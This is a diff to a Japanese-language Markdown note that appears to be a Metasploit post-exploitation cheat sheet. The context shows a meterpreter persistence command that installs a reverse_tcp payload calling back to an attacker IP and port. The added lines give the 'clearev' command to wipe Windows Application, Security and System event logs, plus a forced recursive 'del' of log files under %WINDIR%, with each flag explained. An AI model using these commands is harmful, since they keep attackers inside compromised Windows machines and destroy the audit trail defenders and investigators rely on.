@@ -148,3 +148,15 @@ run persistence -X -i 60 -P windows/meterpreter/reverse_tcp -p 4444 -r [ホス�
 # -p: ペイロード接続先ポート
 # -r: ペイロード接続先IP
 ```
+
+```bash
+# ログ消去（Application, Security, System）
+clearev
+
+# 乱暴なやり方だが、delコマンドで削除することもできる
+del %WINDIR%\*. log /a /s /q /f
+# /a: 削除ファイルの属性指定
+# /s: サブフォルダも対象
+# /q: ワイルドカード使用時に確認メッセージを表示しない
+# /f: 読み取り専用ファイルを矯正削除
+```
